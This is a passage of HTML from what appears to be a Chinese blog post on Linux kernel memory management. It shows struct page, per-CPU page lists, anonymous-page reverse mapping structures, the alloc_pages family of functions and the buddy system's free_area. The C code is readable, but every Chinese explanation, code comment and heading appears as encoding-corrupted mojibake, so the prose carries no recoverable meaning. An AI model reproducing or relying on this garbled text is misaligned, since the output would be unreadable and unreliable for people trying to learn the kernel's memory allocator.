class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pages</span> &#123;</span><br><span class="hljs-type">int</span> count;<span class="hljs-comment">/* number of pages in the list */</span><br><span class="hljs-type">int</span> high;<span class="hljs-comment">/* high watermark, emptying needed */</span><br><span class="hljs-type">int</span> batch;<span class="hljs-comment">/* chunk size for buddy add/remove */</span><br><br><span class="hljs-comment">/* Lists of pages, one per migrate type stored on the pcp-lists */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">lists</span>[<span class="hljs-title">MIGRATE_PCPTYPES</span>];</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>listsï¼šåŒå‘åˆ—è¡¨</li><li>countï¼šç‰©ç†é¡µæ•°é‡</li><li>highï¼šcountè¶…è¿‡äº†highï¼Œé‚£ä¹ˆè¡¨ç¤ºlistä¸­çš„é¡µé¢å¤ªå¤šäº†ï¼Œå†…æ ¸ä¼šä»é«˜é€Ÿç¼“å­˜ä¸­é‡Šæ”¾batchä¸ªé¡µé¢åˆ°ç‰©ç†å†…å­˜åŒºåŸŸä¸­çš„ä¼™ä¼´ç³»ç»Ÿä¸­</li><li>batchï¼šè§ä¸Š</li></ul></li></ul><h2 id="ç‰©ç†å†…å­˜é¡µæè¿°"><a href="#ç‰©ç†å†…å­˜é¡µæè¿°" class="headerlink" title="ç‰©ç†å†…å­˜é¡µæè¿°"></a>ç‰©ç†å†…å­˜é¡µæè¿°</h2><p>pageç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> &#123;</span><br>    <span class="hljs-comment">// å­˜å‚¨ page çš„å®šä½ä¿¡æ¯ä»¥åŠç›¸å…³æ ‡å¿—ä½</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;        <br><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>    <span class="hljs-comment">/* Page cache and anonymous pages */</span><br>            <span class="hljs-comment">// ç”¨æ¥æŒ‡å‘ç‰©ç†é¡µ page è¢«æ”¾ç½®åœ¨äº†å“ªä¸ª lru é“¾è¡¨ä¸Š</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">lru</span>;</span><br>            <span class="hljs-comment">// å¦‚æœ page ä¸ºæ–‡ä»¶é¡µçš„è¯ï¼Œä½ä½ä¸º0ï¼ŒæŒ‡å‘ page æ‰€åœ¨çš„ page cache</span><br>            <span class="hljs-comment">// å¦‚æœ page ä¸ºåŒ¿åé¡µçš„è¯ï¼Œä½ä½ä¸º1ï¼ŒæŒ‡å‘å…¶å¯¹åº”è™šæ‹Ÿåœ°å€ç©ºé—´çš„åŒ¿åæ˜ å°„åŒº anon_vma</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">address_space</span> *<span class="hljs-title">mapping</span>;</span><br>            <span class="hljs-comment">// å¦‚æœ page ä¸ºæ–‡ä»¶é¡µçš„è¯ï¼Œindex ä¸º page åœ¨ page cache ä¸­çš„ç´¢å¼•</span><br>            <span class="hljs-comment">// å¦‚æœ page ä¸ºåŒ¿åé¡µçš„è¯ï¼Œè¡¨ç¤ºåŒ¿åé¡µåœ¨å¯¹åº”è¿›ç¨‹è™šæ‹Ÿå†…å­˜åŒºåŸŸ VMA ä¸­çš„åç§»</span><br>            <span class="hljs-type">pgoff_t</span> index;<br>            <span class="hljs-comment">// åœ¨ä¸åŒåœºæ™¯ä¸‹ï¼Œprivate æŒ‡å‘çš„åœºæ™¯ä¿¡æ¯ä¸åŒ</span><br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>        &#125;;<br>        <br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>    <span class="hljs-comment">/* slab, slob and slub */</span><br>            <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>                <span class="hljs-comment">// ç”¨äºæŒ‡å®šå½“å‰ page ä½äº slab ä¸­çš„å“ªä¸ªå…·ä½“ç®¡ç†é“¾è¡¨ä¸Šã€‚</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slab_list</span>;</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>                    <span class="hljs-comment">// å½“ page ä½äº slab ç»“æ„ä¸­çš„æŸä¸ªç®¡ç†é“¾è¡¨ä¸Šæ—¶ï¼Œnext æŒ‡é’ˆç”¨äºæŒ‡å‘é“¾è¡¨ä¸­çš„ä¸‹ä¸€ä¸ª page</span><br>                    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_64BIT</span><br>                    <span class="hljs-comment">// è¡¨ç¤º slab ä¸­æ€»å…±æ‹¥æœ‰çš„ page ä¸ªæ•°</span><br>                    <span class="hljs-type">int</span> pages;  <br>                    <span class="hljs-comment">// è¡¨ç¤º slab ä¸­æ‹¥æœ‰çš„ç‰¹å®šç±»å‹çš„å¯¹è±¡ä¸ªæ•°</span><br>                    <span class="hljs-type">int</span> pobjects;   <br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>                    <span class="hljs-type">short</span> <span class="hljs-type">int</span> pages;<br>                    <span class="hljs-type">short</span> <span class="hljs-type">int</span> pobjects;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>                &#125;;<br>            &#125;;<br>            <span class="hljs-comment">// ç”¨äºæŒ‡å‘å½“å‰ page æ‰€å±çš„ slab ç®¡ç†ç»“æ„</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">slab_cache</span>;</span> <br>        <br>            <span class="hljs-comment">// æŒ‡å‘ page ä¸­çš„ç¬¬ä¸€ä¸ªæœªåˆ†é…å‡ºå»çš„ç©ºé—²å¯¹è±¡</span><br>            <span class="hljs-type">void</span> *freelist;     <br>            <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>                <span class="hljs-comment">// æŒ‡å‘ page ä¸­çš„ç¬¬ä¸€ä¸ªå¯¹è±¡</span><br>                <span class="hljs-type">void</span> *s_mem;    <br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>            <span class="hljs-comment">/* SLUB */</span><br>                    <span class="hljs-comment">// è¡¨ç¤º slab ä¸­å·²ç»è¢«åˆ†é…å‡ºå»çš„å¯¹è±¡ä¸ªæ•°</span><br>                    <span class="hljs-type">unsigned</span> inuse:<span class="hljs-number">16</span>;<br>                    <span class="hljs-comment">// slab ä¸­æ‰€æœ‰çš„å¯¹è±¡ä¸ªæ•°</span><br>                    <span class="hljs-type">unsigned</span> objects:<span class="hljs-number">15</span>;<br>                    <span class="hljs-comment">// å½“å‰å†…å­˜é¡µ page è¢« slab æ”¾ç½®åœ¨ CPU æœ¬åœ°ç¼“å­˜åˆ—è¡¨ä¸­ï¼Œfrozen = 1ï¼Œå¦åˆ™ frozen = 0</span><br>                    <span class="hljs-type">unsigned</span> frozen:<span class="hljs-number">1</span>;<br>                &#125;;<br>            &#125;;<br>        &#125;;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>    <span class="hljs-comment">/* å¤åˆé¡µ compound page ç›¸å…³*/</span><br>            <span class="hljs-comment">// å¤åˆé¡µçš„å°¾é¡µæŒ‡å‘é¦–é¡µ</span><br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> compound_head;    <br>            <span class="hljs-comment">// ç”¨äºé‡Šæ”¾å¤åˆé¡µçš„ææ„å‡½æ•°ï¼Œä¿å­˜åœ¨é¦–é¡µä¸­</span><br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> compound_dtor;<br>            <span class="hljs-comment">// è¯¥å¤åˆé¡µæœ‰å¤šå°‘ä¸ª page ç»„æˆ</span><br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> compound_order;<br>            <span class="hljs-comment">// è¯¥å¤åˆé¡µè¢«å¤šå°‘ä¸ªè¿›ç¨‹ä½¿ç”¨ï¼Œå†…å­˜é¡µåå‘æ˜ å°„çš„æ¦‚å¿µï¼Œé¦–é¡µä¸­ä¿å­˜</span><br>            <span class="hljs-type">atomic_t</span> compound_mapcount;<br>        &#125;;<br><br>        <span class="hljs-comment">// è¡¨ç¤º slab ä¸­éœ€è¦é‡Šæ”¾å›æ”¶çš„å¯¹è±¡é“¾è¡¨</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu_head</span>;</span><br>    &#125;;<br><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span>     <span class="hljs-comment">/* This union is 4 bytes in size. */</span><br>        <span class="hljs-comment">// è¡¨ç¤ºè¯¥ page æ˜ å°„äº†å¤šå°‘ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜ç©ºé—´ï¼Œä¸€ä¸ª page å¯ä»¥è¢«å¤šä¸ªè¿›ç¨‹æ˜ å°„</span><br>        <span class="hljs-type">atomic_t</span> _mapcount;<br><br>    &#125;;<br><br>    <span class="hljs-comment">// å†…æ ¸ä¸­å¼•ç”¨è¯¥ç‰©ç†é¡µçš„æ¬¡æ•°ï¼Œè¡¨ç¤ºè¯¥ç‰©ç†é¡µçš„æ´»è·ƒç¨‹åº¦ã€‚</span><br>    <span class="hljs-type">atomic_t</span> _refcount;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span><br>    <span class="hljs-type">void</span> *virtual;  <span class="hljs-comment">// å†…å­˜é¡µå¯¹åº”çš„è™šæ‹Ÿå†…å­˜åœ°å€</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* WANT_PAGE_VIRTUAL */</span></span><br><br>&#125; _struct_page_alignment;<br></code></pre></td></tr></table></figure><ul><li><p>mappingï¼špage cacheï¼ˆé«˜é€Ÿé¡µç¼“å­˜ï¼‰ç»“æ„ä½“address_spaceï¼Œè¢«æ–‡ä»¶çš„inodeæŒæœ‰</p><ul><li>pageä¸ºæ–‡ä»¶é¡µï¼šmappingæœ€ä½ä½ä¸º0ï¼ŒæŒ‡å‘é¡µå…³è”æ–‡ä»¶çš„address_space</li><li>pageä¸ºåŒ¿åé¡µï¼šmappingæœ€ä½ä½ä¸º1ï¼ŒæŒ‡å‘åŒ¿åé¡µåœ¨è¿›ç¨‹è™šæ‹Ÿå†…å­˜ç©ºé—´ä¸­çš„åŒ¿åæ˜ å°„åŒºåŸŸanon_vmaç»“æ„ï¼Œç”¨äºç‰©ç†å†…å­˜åˆ°è™šæ‹Ÿå†…å­˜çš„åå‘æ˜ å°„</li></ul></li><li><p>indexï¼špgoff_t</p><ul><li>pageä¸ºæ–‡ä»¶é¡µï¼šè¡¨ç¤ºè¯¥å†…å­˜é¡µä¸­çš„æ–‡ä»¶æ•°æ®åœ¨æ–‡ä»¶å†…éƒ¨çš„åç§»offsetï¼Œåç§»å•ä½ä¸ºé¡µå¤§å°</li><li>pageä¸ºåŒ¿åé¡µï¼šè¡¨ç¤ºåŒ¿åé¡µåœ¨å¯¹åº”è¿›ç¨‹è™šæ‹Ÿå†…å­˜åŒºåŸŸVMAä¸­çš„åç§»</li></ul></li><li><p>_mapcountï¼šè¡¨ç¤ºè¯¥pageæ˜ å°„äº†å¤šå°‘ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜ç©ºé—´ï¼Œä¸€ä¸ªpageå¯ä»¥è¢«å¤šä¸ªè¿›ç¨‹æ˜ å°„</p></li><li><p>lruï¼šæŒ‡å‘ç‰©ç†é¡µè¢«æ”¾ç½®åœ¨äº†å“ªä¸ªé“¾è¡¨ä¸Šï¼ˆactiveï¼Œinactiveï¼‰</p></li><li><p>_refcountï¼šç”¨æ¥è®°å½•å†…æ ¸ä¸­å¼•ç”¨è¯¥ç‰©ç†é¡µçš„æ¬¡æ•°ï¼Œè¡¨ç¤ºè¯¥ç‰©ç†é¡µçš„æ´»è·ƒç¨‹åº¦</p></li><li><p>flagsï¼š</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/flags.png" class title="flags"><ul><li>é«˜8ä½å‚¨å­˜å®šä½ä¿¡æ¯ï¼ˆsectionï¼Œzoneï¼Œnodeï¼‰</li><li>å‚¨å­˜è®¿é—®ç›¸å…³ï¼Œæ¢å…¥æ¢å‡ºç›¸å…³ç­‰æ ‡å¿—</li></ul></li><li><p>å¤åˆé¡µç›¸å…³</p><ul><li>flagsï¼šå¦‚æœæ˜¯é¦–é¡µä¼šè®¾ç½®PG_head</li><li>compound_headï¼šå¤åˆé¡µçš„å°¾é¡µç”¨æ¥æŒ‡å‘é¦–é¡µ</li><li>compound_dtorï¼šç”¨äºé‡Šæ”¾å¤åˆé¡µçš„ææ„å‡½æ•°</li><li>compound_orderï¼šå¤åˆé¡µçš„order</li><li>compound_mapcountï¼šä½¿ç”¨å¤åˆé¡µçš„è¿›ç¨‹ä¸ªæ•°ï¼Œå†…å­˜é¡µåå‘æ˜ å°„çš„æ¦‚å¿µï¼Œé¦–é¡µä¸­ä¿å­˜</li><li>compound_pincountï¼šå¤åˆé¡µä½¿ç”¨è®¡æ•°ï¼Œé¦–é¡µä¸­ä¿å­˜</li></ul></li></ul><h3 id="åŒ¿åé¡µçš„åå‘æ˜ å°„"><a href="#åŒ¿åé¡µçš„åå‘æ˜ å°„" class="headerlink" title="åŒ¿åé¡µçš„åå‘æ˜ å°„"></a>åŒ¿åé¡µçš„åå‘æ˜ å°„</h3><p>åœ¨ç‰©ç†é¡µéœ€è¦è¢«è¿ç§»æˆ–è€…å›æ”¶æ—¶ä½¿ç”¨ï¼Œæ­¤æ—¶éœ€è¦æ‰¾åˆ°ç‰©ç†é¡µæ˜ å°„çš„è™šæ‹Ÿåœ°å€ï¼Œå¹¶æ–­å¼€è¿æ¥</p><ul><li><p>pageï¼šç»“æ„ä½“è¡¨ç¤ºä¸€ä¸ªç‰©ç†é¡µ</p></li><li><p>anon_vmaï¼šè¡¨ç¤ºä¸€ä¸ªåŒ¿åé¡µï¼ˆä»…ç”¨äºåå‘æ˜ å°„ï¼‰</p></li><li><p>anon_vma_chainï¼šè¡¨ç¤ºä¸€ä¸ªåŒ¿åé¡µå’Œä¸€æ®µè™šæ‹Ÿå†…å­˜çš„å…³ç³»</p><p><strong>åŒ¿åé¡µå’Œè™šæ‹Ÿå†…å­˜æ˜¯ä¸€å¯¹å¤šçš„å…³ç³»ï¼Œå› ä¸ºä¸€ä¸ªåŒ¿åé¡µå¯èƒ½æ˜ å°„åˆ°å¾ˆå¤šè¿›ç¨‹çš„è™šæ‹Ÿç©ºé—´ â†’ anon_vmaå’Œanon_vma_chainä¹Ÿæ˜¯ä¸€å¯¹å¤šçš„å…³ç³»</strong></p></li><li><p>vm_area_structï¼šè¡¨ç¤ºä¸€æ®µè™šæ‹Ÿå†…å­˜</p></li></ul><ul><li><p>pageä¸­çš„mappingæŒ‡å‘anon_vmaç»“æ„ä½“</p></li><li><p>anon_vmaç»“æ„ä½“ä¸­çš„rb_rootçº¢é»‘æ ‘å‚¨å­˜äº†æ‰€æœ‰ä¸åŒ¿åé¡µç›¸å…³çš„anon_vma_chain</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anon_vma</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anon_vma</span> *<span class="hljs-title">root</span>;</span><span class="hljs-comment">/* Root of this anon_vma tree */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rw_semaphore</span> <span class="hljs-title">rwsem</span>;</span><span class="hljs-comment">/* W: modification, R: walking the list */</span><br><span class="hljs-type">atomic_t</span> refcount;<br><span class="hljs-type">unsigned</span> degree;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anon_vma</span> *<span class="hljs-title">parent</span>;</span><span class="hljs-comment">/* Parent of this anon_vma */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rb_root_cached</span> <span class="hljs-title">rb_root</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>anon_vma_chainç»“æ„ä½“ä¸²è”vm_area_structå’Œanon_vma</p><ul><li>vmaæŒ‡å‘ç›¸å…³çš„vm_area_struct</li><li>anon_vmaæŒ‡å‘ç›¸å…³çš„è™šæ‹Ÿé¡µ</li><li>same_vmaåŒå‘é“¾è¡¨ä¸²è”äº†vmaçš„æ‰€æœ‰åŒ¿åé¡µ</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anon_vma_chain</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anon_vma</span> *<span class="hljs-title">anon_vma</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">same_vma</span>;</span>   <span class="hljs-comment">/* locked by mmap_lock &amp; page_table_lock */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rb_node</span> <span class="hljs-title">rb</span>;</span><span class="hljs-comment">/* locked by anon_vma-&gt;rwsem */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rb_subtree_last;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_VM_RB</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cached_vma_start, cached_vma_last;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>vm_area_structè¡¨ç¤ºVMA</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">anon_vma_chain</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anon_vma</span> *<span class="hljs-title">anon_vma</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>anon_vma_chainåŒå‘é“¾è¡¨ä¸²è¿äº†VMAçš„æ‰€æœ‰åŒ¿åé¡µ</li><li>anon_vmaç”¨äºå¿«é€Ÿåˆ¤æ–­ VMA æœ‰æ²¡æœ‰å¯¹åº”çš„åŒ¿å page</li></ul></li></ul><h1 id="ç‰©ç†å†…å­˜åˆ†é…"><a href="#ç‰©ç†å†…å­˜åˆ†é…" class="headerlink" title="ç‰©ç†å†…å­˜åˆ†é…"></a>ç‰©ç†å†…å­˜åˆ†é…</h1><h2 id="ç‰©ç†å†…å­˜åˆ†é…æ¥å£"><a href="#ç‰©ç†å†…å­˜åˆ†é…æ¥å£" class="headerlink" title="ç‰©ç†å†…å­˜åˆ†é…æ¥å£"></a>ç‰©ç†å†…å­˜åˆ†é…æ¥å£</h2><p>alloc_pageså‡½æ•°ç”¨äºè¯·æ±‚2çš„orderæ¬¡å¹‚ä¸ªpage</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">alloc_pages</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> gfp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order)</span>;<br></code></pre></td></tr></table></figure><ul><li>orderï¼šåˆ†é…é˜¶</li><li>gfpï¼šç”¨äºè§„èŒƒç‰©ç†å†…å­˜åˆ†é…è¡Œä¸ºçš„ä¿®é¥°ç¬¦</li></ul><p>è¿”å›çš„æ˜¯pageç»“æ„ä½“ï¼Œéœ€è¦è½¬æ¢æˆè™šæ‹Ÿåœ°å€ä½¿ç”¨ï¼Œ__get_free_pageså‡½æ•°å¯ä»¥è¿”å›è™šæ‹Ÿåœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> __get_free_pages(<span class="hljs-type">gfp_t</span> gfp_mask, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br>page = alloc_pages(gfp_mask &amp; ~__GFP_HIGHMEM, order);<br><span class="hljs-keyword">if</span> (!page)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page_address(page);<br>&#125;<br>EXPORT_SYMBOL(__get_free_pages);<br></code></pre></td></tr></table></figure><p>å†…éƒ¨ä¹Ÿæ˜¯è°ƒç”¨äº†alloc_pagesï¼Œè¿›è¡Œäº†åœ°å€è½¬æ¢</p><ul><li>ä¸èƒ½åˆ†é…é«˜ç«¯å†…å­˜ï¼Œé«˜ç«¯å†…å­˜ä¸é€‚ç”¨äºç›´æ¥åœ°å€è½¬æ¢</li><li>è¿”å›åœ°å€ä½äºç›´æ¥æ˜ å°„åŒº</li></ul><p>get_zeroed_pageä¼šæŠŠpageå†…å®¹æ¸…é›¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">get_zeroed_page</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> gfp_mask)</span><br>&#123;<br><span class="hljs-keyword">return</span> __get_free_pages(gfp_mask | __GFP_ZERO, <span class="hljs-number">0</span>);<br>&#125;<br>EXPORT_SYMBOL(get_zeroed_page);<br></code></pre></td></tr></table></figure><p>__get_dma_pagesåªåˆ†é…DMAå†…å­˜é¡µ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> __get_dma_pages(gfp_mask, order) \</span><br><span class="hljs-meta">__get_free_pages((gfp_mask) | GFP_DMA, (order))</span><br></code></pre></td></tr></table></figure><p>ä¸¤ä¸ªå†…å­˜é‡Šæ”¾å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __free_pages(<span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order);<br><span class="hljs-type">void</span> <span class="hljs-title function_">free_pages</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order)</span>;<br></code></pre></td></tr></table></figure><ul><li>__free_pageså¯¹åº”alloc_pagesï¼Œä½¿ç”¨pageç»“æ„ä½“</li><li>free_pageså¯¹åº”__get_free_pagesï¼Œä½¿ç”¨è™šæ‹Ÿå†…å­˜åœ°å€</li></ul><h2 id="ç‰©ç†å†…å­˜åˆ†é…æºç å®ç°"><a href="#ç‰©ç†å†…å­˜åˆ†é…æºç å®ç°" class="headerlink" title="ç‰©ç†å†…å­˜åˆ†é…æºç å®ç°"></a>ç‰©ç†å†…å­˜åˆ†é…æºç å®ç°</h2><p>å¤§ä½¬å†™çš„å¾ˆè¯¦ç»†äº†æ‰€ä»¥å°±æ”¾ä¸¤å¼ å›¾doge</p><p>å‡½æ•°è°ƒç”¨å›¾</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/allocpages.png" class title="allocpages"><p>__alloc_pageså‡½æ•°çš„é€»è¾‘</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/wateralloc.png" class title="wateralloc"><h1 id="buddy-system"><a href="#buddy-system" class="headerlink" title="buddy system"></a>buddy system</h1><p>zoneä¸­buddy systemç›¸å…³æˆå‘˜</p><p>free_areaçš„ä¸‹æ ‡è¡¨ç¤ºorder</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> &#123;</span><br>    <span class="hljs-comment">// è¢«ä¼™ä¼´ç³»ç»Ÿæ‰€ç®¡ç†çš„ç‰©ç†å†…å­˜é¡µä¸ªæ•°ï¼ˆpresent_pages-reserved_pagesï¼‰</span><br>    <span class="hljs-type">atomic_long_t</span>       managed_pages;<br>    <span class="hljs-comment">// ä¼™ä¼´ç³»ç»Ÿçš„æ ¸å¿ƒæ•°æ®ç»“æ„</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span>    <span class="hljs-title">free_area</span>[<span class="hljs-title">MAX_ORDER</span>];</span><br>&#125;<br></code></pre></td></tr></table></figure><p>free_areaï¼Œä¸åŒè¿ç§»ç±»å‹çš„pageç”¨ä¸åŒçš„é“¾è¡¨ç®¡ç†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">free_list</span>[<span class="hljs-title">MIGRATE_TYPES</span>];</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>nr_free;<br>&#125;;<br><br><span class="hljs-class"><span 